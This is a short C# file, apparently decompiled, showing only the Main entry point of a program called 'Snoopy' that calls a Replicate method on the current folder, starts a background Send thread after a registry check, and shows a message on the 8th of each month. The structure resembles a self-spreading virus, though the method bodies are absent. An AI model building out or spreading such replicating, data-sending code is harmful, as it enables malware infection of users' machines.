using System;
using System.IO;
using System.Threading;

namespace Snoopy;

internal class Program
{
	private static string myDir = Directory.GetCurrentDirectory();

	private static Thread t;

	private static void Main(string[] args)
	{
		Snoopy snoopy = new Snoopy();
		snoopy.Replicate(myDir);
		if (snoopy.CheckReg())
		{
			t = new Thread(snoopy.Send);
			t.Start();
		}
		if (DateTime.Now.Day == 8)
		{
			snoopy.Message();
		}
	}
}
